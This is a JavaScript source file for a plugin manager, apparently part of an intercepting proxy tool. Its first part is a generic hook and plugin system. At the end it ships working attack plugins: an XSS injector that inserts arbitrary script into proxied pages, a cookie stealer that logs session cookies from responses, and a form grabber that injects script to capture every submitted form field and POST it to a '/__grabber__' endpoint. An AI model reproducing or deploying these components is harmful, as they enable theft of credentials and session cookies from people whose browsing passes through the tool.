const fs = require('fs');
const path = require('path');
const logger = require('./logger');
const EventEmitter = require('eventemitter3');

class PluginManager extends EventEmitter {
  constructor() {
    super();
    this.plugins = new Map();
    this.hooks = new Map();
    this.enabled = true;
  }

  // Register a plugin
  register(plugin) {
    if (!plugin.name) {
      throw new Error('Plugin must have a name');
    }

    if (this.plugins.has(plugin.name)) {
      logger.warn(`Plugin already registered: ${plugin.name}`);
      return false;
    }

    const wrappedPlugin = {
      name: plugin.name,
      version: plugin.version || '1.0.0',
      description: plugin.description || '',
      author: plugin.author || 'Unknown',
      hooks: plugin.hooks || {},
      init: plugin.init || (() => {}),
      destroy: plugin.destroy || (() => {}),
      enabled: plugin.enabled !== false,
      instance: null
    };

    this.plugins.set(plugin.name, wrappedPlugin);
    
    // Register hooks
    for (const [hookName, handler] of Object.entries(wrappedPlugin.hooks)) {
      this.addHook(hookName, plugin.name, handler);
    }

    logger.info(`Plugin registered: ${plugin.name} v${wrappedPlugin.version}`);
    this.emit('plugin:registered', wrappedPlugin);
    
    return true;
  }

  // Unregister a plugin
  unregister(pluginName) {
    const plugin = this.plugins.get(pluginName);
    if (!plugin) {
      return false;
    }

    // Remove hooks
    for (const hookName of Object.keys(plugin.hooks)) {
      this.removeHook(hookName, pluginName);
    }

    // Call destroy
    try {
      plugin.destroy();
    } catch (error) {
      logger.error(`Plugin destroy error: ${pluginName}`, { error: error.message });
    }

    this.plugins.delete(pluginName);
    logger.info(`Plugin unregistered: ${pluginName}`);
    this.emit('plugin:unregistered', { name: pluginName });
    
    return true;
  }

  // Load plugin from file
  loadPlugin(filePath) {
    try {
      const pluginModule = require(filePath);
      const plugin = typeof pluginModule === 'function' ? pluginModule() : pluginModule;
      return this.register(plugin);
    } catch (error) {
      logger.error(`Failed to load plugin: ${filePath}`, { error: error.message });
      return false;
    }
  }

  // Load all plugins from directory
  loadPluginsFromDir(dirPath) {
    if (!fs.existsSync(dirPath)) {
      return 0;
    }

    let loaded = 0;
    const files = fs.readdirSync(dirPath);
    
    for (const file of files) {
      if (file.endsWith('.js')) {
        const filePath = path.join(dirPath, file);
        if (this.loadPlugin(filePath)) {
          loaded++;
        }
      }
    }

    return loaded;
  }

  // Add a hook
  addHook(hookName, pluginName, handler) {
    if (!this.hooks.has(hookName)) {
      this.hooks.set(hookName, new Map());
    }
    
    this.hooks.get(hookName).set(pluginName, handler);
    logger.debug(`Hook added: ${hookName} by ${pluginName}`);
  }

  // Remove a hook
  removeHook(hookName, pluginName) {
    if (this.hooks.has(hookName)) {
      this.hooks.get(hookName).delete(pluginName);
      if (this.hooks.get(hookName).size === 0) {
        this.hooks.delete(hookName);
      }
    }
  }

  // Execute a hook
  async executeHook(hookName, context = {}) {
    if (!this.enabled) {
      return context;
    }

    const hooks = this.hooks.get(hookName);
    if (!hooks || hooks.size === 0) {
      return context;
    }

    let result = { ...context };
    
    for (const [pluginName, handler] of hooks) {
      const plugin = this.plugins.get(pluginName);
      if (!plugin || !plugin.enabled) continue;

      try {
        const hookResult = await handler(result);
        if (hookResult !== undefined) {
          result = { ...result, ...hookResult };
        }
        this.emit('hook:executed', { hookName, pluginName });
      } catch (error) {
        logger.error(`Hook error: ${hookName} in ${pluginName}`, { error: error.message });
      }
    }

    return result;
  }

  // Get all plugins
  getPlugins() {
    return Array.from(this.plugins.values());
  }

  // Get plugin by name
  getPlugin(name) {
    return this.plugins.get(name);
  }

  // Enable/disable plugin
  setPluginEnabled(name, enabled) {
    const plugin = this.plugins.get(name);
    if (plugin) {
      plugin.enabled = enabled;
      logger.info(`Plugin ${name} ${enabled ? 'enabled' : 'disabled'}`);
      return true;
    }
    return false;
  }

  // Enable/disable all plugins
  setAllEnabled(enabled) {
    this.enabled = enabled;
    for (const plugin of this.plugins.values()) {
      plugin.enabled = enabled;
    }
    logger.info(`All plugins ${enabled ? 'enabled' : 'disabled'}`);
  }

  // Get available hooks
  getAvailableHooks() {
    return Array.from(this.hooks.keys());
  }

  // Clear all plugins
  clear() {
    for (const pluginName of this.plugins.keys()) {
      this.unregister(pluginName);
    }
    this.hooks.clear();
    logger.debug('All plugins cleared');
  }
}

// Built-in plugins
PluginManager.builtIn = {
  // XSS Payload Injector
  xssInjector: {
    name: 'xss-injector',
    version: '1.0.0',
    description: 'Injects XSS payloads into HTML responses',
    hooks: {
      'response:html': async (context) => {
        if (context.config?.injection?.code) {
          const payload = `<script>\n// [XSS Injector]\n${context.config.injection.code}\n</script>`;
          context.html = context.html.replace('</body>', payload + '\n</body>');
        }
        return context;
      }
    }
  },

  // Cookie Stealer
  cookieStealer: {
    name: 'cookie-stealer',
    version: '1.0.0',
    description: 'Logs and captures cookies from responses',
    hooks: {
      'response:received': async (context) => {
        if (context.response?.headers?.['set-cookie']) {
          logger.info('Cookies captured', { cookies: context.response.headers['set-cookie'] });
        }
        return context;
      }
    }
  },

  // Form Grabber
  formGrabber: {
    name: 'form-grabber',
    version: '1.0.0',
    description: 'Captures form submissions',
    hooks: {
      'response:html': async (context) => {
        const script = `
        <script>
        document.querySelectorAll('form').forEach(form => {
          form.addEventListener('submit', function(e) {
            const data = new FormData(form);
            const entries = {};
            for (let [key, value] of data.entries()) {
              entries[key] = value;
            }
            console.log('[FormGrabber] Submission:', entries);
            fetch('/__grabber__', {
              method: 'POST',
              headers: {'Content-Type': 'application/json'},
              body: JSON.stringify({form: form.action, data: entries})
            });
          });
        });
        </script>`;
        context.html = context.html.replace('</body>', script + '\n</body>');
        return context;
      }
    }
  },

  // Network Logger
  networkLogger: {
    name: 'network-logger',
    version: '1.0.0',
    description: 'Logs all network activity',
    hooks: {
      'request:before': async (context) => {
        logger.debug(`Outgoing: ${context.method} ${context.url}`);
        return context;
      },
      'response:received': async (context) => {
        logger.debug(`Incoming: ${context.response?.status} ${context.url}`);
        return context;
      }
    }
  }
};

module.exports = PluginManager;
